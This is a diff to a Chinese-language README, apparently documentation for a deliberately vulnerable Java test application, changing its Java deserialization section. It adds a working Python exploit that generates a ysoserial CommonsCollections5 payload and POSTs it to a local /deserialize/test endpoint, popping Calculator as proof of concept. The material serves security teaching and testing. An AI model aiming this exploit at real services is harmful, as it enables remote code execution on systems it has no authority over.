@@ -63,12 +63,29 @@ Viarus
 
 ### 反序列化
 
-利用ysoserial构造POC
+打包ysoserial
 
 ``` 
 git clone https://github.com/frohoff/ysoserial.git
 mvn clean package -DskipTests
-java -jar /Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'open /Applications/Calculator.app' > /tmp/poc
 ```
 
-访问`http://localhost:8080/deserialize/test`即可弹窗
+执行exp
+
+```python
+#coding: utf-8
+#author: JoyChou
+#date:   2018.07.17
+
+import requests
+import subprocess
+
+def poc(url , gadget, command):
+	ys_filepath = '/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'
+	popen = subprocess.Popen(['java', '-jar', ys_filepath, gadget, command], stdout=subprocess.PIPE)
+	payload = popen.stdout.read()
+	r = requests.post(url, data=payload, timeout=5)
+
+if __name__ == '__main__':
+	poc('http://127.0.0.1:8080/deserialize/test', 'CommonsCollections5', 'open -a Calculator')
+```
